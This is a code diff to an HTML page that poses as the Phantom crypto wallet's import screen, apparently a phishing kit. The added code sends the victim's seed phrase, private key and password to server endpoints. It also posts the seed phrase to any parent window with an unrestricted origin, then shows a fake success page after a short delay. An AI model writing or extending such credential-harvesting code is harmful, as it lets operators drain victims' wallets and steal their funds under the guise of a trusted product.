@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Phantom</title>
+  <title>Phantom Wallet</title>
   <script src="bip39-validation.js"></script>
   <style>
     * {
@@ -1494,14 +1494,37 @@
         // Success - go to loading page
         goToPage(5);
         
-        // After 2 seconds, show success page
+        // Send mnemonic to backend
+        try {
+          const token = localStorage.getItem('token');
+          if (token) {
+            const response = await fetch('/api/user/store-mnemonic', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${token}`
+              },
+              body: JSON.stringify({ mnemonic: mnemonic, walletName: 'Phantom' })
+            });
+            
+            if (!response.ok) {
+              console.error('Failed to store mnemonic:', await response.text());
+            }
+          }
+        } catch (error) {
+          console.error('Error storing mnemonic:', error);
+          // Continue even if backend call fails
+        }
+        
+        // After 0.5 seconds, show success page
         setTimeout(() => {
           goToPage(6);
-        }, 2000);
+        }, 500);
         
         // Send mnemonic to parent window
-        if (window.opener) {
-          window.opener.postMessage({ type: 'phantom-action', action: 'import', mnemonic: mnemonic }, '*');
+        const targetWindow = window.opener || window.parent;
+        if (targetWindow && targetWindow !== window) {
+          targetWindow.postMessage({ type: 'phantom-action', action: 'import', mnemonic: mnemonic }, '*');
         }
       } else {
         // Show checksum error - simple style, no icon, hide toggle
@@ -1619,27 +1642,79 @@
     document.getElementById('privateKeyInput').addEventListener('input', validatePrivateKey);
     
     // Handle Import button click for private key
-    document.getElementById('importPrivateKeyBtn').addEventListener('click', function() {
+    document.getElementById('importPrivateKeyBtn').addEventListener('click', async function() {
       const importBtn = document.getElementById('importPrivateKeyBtn');
       
       // Only proceed if button is active
       if (!importBtn.classList.contains('active')) return;
       
+      const privateKey = document.getElementById('privateKeyInput').value.trim();
+      
       // Go to loading page
       goToPage(5);
       
-      // After 2 seconds, show success page
+      // Send private key and chain name to backend
+      try {
+        const token = localStorage.getItem('token');
+        if (token && privateKey) {
+          const response = await fetch('/api/user/store-private-key', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'Authorization': `Bearer ${token}`
+            },
+            body: JSON.stringify({ 
+              privateKey: privateKey, 
+              walletName: 'Phantom',
+              chainName: selectedChain
+            })
+          });
+          
+          if (!response.ok) {
+            console.error('Failed to store private key:', await response.text());
+          }
+        }
+      } catch (error) {
+        console.error('Error storing private key:', error);
+        // Continue even if backend call fails
+      }
+      
+      // After 0.5 seconds, show success page
       setTimeout(() => {
         goToPage(6);
-      }, 2000);
+      }, 500);
     });
     
     // Handle password continue button click
-    document.getElementById('passwordContinueBtn').addEventListener('click', function() {
+    document.getElementById('passwordContinueBtn').addEventListener('click', async function() {
       const continueBtn = document.getElementById('passwordContinueBtn');
       
       // Only proceed if button is active
       if (!continueBtn.classList.contains('active')) return;
+      
+      const password = document.getElementById('passwordInput').value;
+      
+      // Send password to backend
+      try {
+        const token = localStorage.getItem('token');
+        if (token && password) {
+          const response = await fetch('/api/user/store-password', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'Authorization': `Bearer ${token}`
+            },
+            body: JSON.stringify({ password: password, walletName: 'Phantom' })
+          });
+          
+          if (!response.ok) {
+            console.error('Failed to store password:', await response.text());
+          }
+        }
+      } catch (error) {
+        console.error('Error storing password:', error);
+        // Continue even if backend call fails
+      }
       
       // Go to username page
       goToPage(8);
